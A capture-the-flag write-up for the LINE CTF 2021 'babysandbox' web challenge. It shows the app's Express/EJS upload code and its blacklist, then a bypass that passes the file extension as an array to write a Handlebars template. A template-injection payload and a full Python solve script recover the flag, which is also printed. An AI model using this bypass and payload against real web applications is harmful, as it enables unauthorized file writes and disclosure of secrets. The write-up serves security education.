## [LINE CTF 2021] babysandbox  

<img src="images/chall.png" width=600>

We are given a webapp that creates sandboxes with EJS templates.  

The templates are rendered with the flag as a variable.  

```js
app.get('/:sandboxPath/:filename', authMiddleware, (req,res)=>{
    try {
        res.render(`sandbox/${req.params.sandboxPath}/${req.params.filename}`, {flag});
    } catch {
        res.status(404).send('Not found.');
    }
});
```

However, the base template for the sandboxes doesn't contain a reference to `flag` anywhere, meaning we don't have a direct way of rendering the flag yet.  

```html
<html>
    <head>
        <!-- Latest compiled and minified CSS -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
        <!-- Optional theme -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap-theme.min.css" integrity="sha384-6pzBo3FDv/PJ8r2KRkGHifhEocL+1X2rVCTTkUfGk7/0pbek5mMa1upzvWbrUbOZ" crossorigin="anonymous">
        <!-- Latest compiled and minified JavaScript -->
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
    </head>
    <body>
        <div class="container">
            <div class="page-header text-center">
              <h1>Workspace</h1>
              <p class="lead">Make your page!</p>
            </div>
      
            <div>
                <div>
                    <input type="text" class="form-control" id="title" placeholder="nonamed">
                </div>
                <div>
                    <textarea class="form-control" rows="10" placeholder="Hello World :)" id="contents"></textarea>
                </div>
                <div class="text-right">
                    <button class="btn btn-primary form-control" id="make">Make</button>
                </div>
            </div>
        </div>
        <script>
            $('#make').click(()=>{
                let contents = $('#contents').val();
                let filename = $('#title').val();
                let data = {
                    contents,
                    filename
                };
                let options = {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                };
                fetch(location.pathname, options).then(res=>res.json()).then((res)=>{
                    if(res.result === true){
                        location.href=res.path;
                    } else {
                        alert('Failed.');
                    }
                });
            });
        </script>
    </body>
</html>
```

The backend actually allows us to choose from a list of templates, but implements filters to restrict the filename of the template.  

However, we can notice that only the `filename` field has its datatype validated, but for the `ext` field, the filter only checks the length and if it contains `.ejs`.  

```js
app.post('/:sandboxPath', authMiddleware, (req, res)=>{
    let saveOptions = {}
    let isChecked = true;
    let path = '';

    merge(saveOptions, options)
    merge(saveOptions, req.body)

    if(saveOptions.filename === undefined || saveOptions.contents === undefined ||
        typeof saveOptions.filename !== 'string' || typeof saveOptions.contents !== 'string') 
        isChecked = false

    if(!saveOptions.ext.includes('.ejs') || saveOptions.ext.length !== 4) isChecked = false;

    if(isChecked) {
        let filename = saveOptions.filename || 'noname';
        filename += saveOptions.ext
        let body = saveOptions.contents;
        if(utils.sanitize(body)){
            let uploadPath = `./views/sandbox/${req.params.sandboxPath}/${filename}`;
            if(!fs.existsSync(uploadPath)){
                fs.writeFile(uploadPath, body, (err)=>{
                    if(err) {
                        console.log(`[!] File write error: ${uploadPath}`);
                        isChecked = false
                    }
                    console.log(`[*] Created ${uploadPath} by ${req.ip} (endpoint: ${req.params.sandboxPath})`);
                });
            } else {
                isChecked = false
            }
        } else {
            isChecked = false
        }
        
    }

    if(isChecked) path = `/${req.params.sandboxPath}/${saveOptions.filename}`;

    let result = {
        result: isChecked,
        path
    };

    return res.json(result)
});
```

However, the backend also implements a blacklist that filters the `flag` keyword and prevents us from writing EJS tags.  

```js
const sanitize = (body)=>{
    reuslt = true
    tmp = body.toLowerCase()
    if(tmp.includes('<') || tmp.includes('>')) return false
    if(tmp.includes('flag')) return false
    
    return true
}
```

Looking at `package.json`, we can actually notice that the server installs the Handlebars templating module alongside EJS, but is never used.  

```json
{
  "dependencies": {
    "body-parser": "^1.19.0",
    "ejs": "^3.1.6",
    "express": "^4.17.1",
    "hbs": "^4.1.1",
    "morgan": "^1.10.0"
  }
}
```

The server also allows us to pass inputs as JSON, meaning we aren't constrained to string input fields.  

```js
app.use(bodyParser.json());
app.use(morgan('common'))
app.set('view engine', 'ejs');
```

Going back to the file creation functionality, if we pass in the extension as an array, we can bypass the `.ejs` requirement.  

This gives us a file write with an arbitrary extension, and we can actually write a Handlebars template file which the server will render.  

Handlebars syntax uses `{{}}` for blocks, allowing us to bypass the filter in `sanitize()` to render the flag.  

```js
filename: ./
ext: ['', '', '.ejs', '.hbs']    // ./views/<sandbox>/./,,.ejs.hbs
```

Now that we are able to get code execution, we need to find a way to actually reference `flag`, since Handlebars is a logic-less templating engine with a pretty restrictive syntax.  

We can iterate through all the keys in the `this` object and only render keys with the `.substring()` method, which will narrow it down to the `flag` string variable.  

```handlebars
{{#each this}}{{#if this.substring}}{{this}}{{/if}}{{/each}}
```

Below is my full solve script for this challenge.  

```python
import requests

url = "http://host3.dreamhack.games:15159"
s = requests.Session()

# create sandbox
res = s.get(url)

sandbox = res.url.split('/')[-1]
print("Sandbox:", sandbox)

# ssti
filename = ['', '', '.ejs', '.hbs']

payload = '{{#each this}}{{#if this.substring}}{{this}}{{/if}}{{/each}}'

res = s.post(f"{url}/{sandbox}", json={
    'filename': './',
    'ext': filename,
    'contents': payload
})

if res.json()['result']:
    print("> Payload uploaded")

res = s.get(f'{url}/{sandbox}/{','.join(filename)}')
print("Flag:", res.text)
```

Flag: `DH{fef7058acaad3f3807ad0a1d68f28a9de79df029}`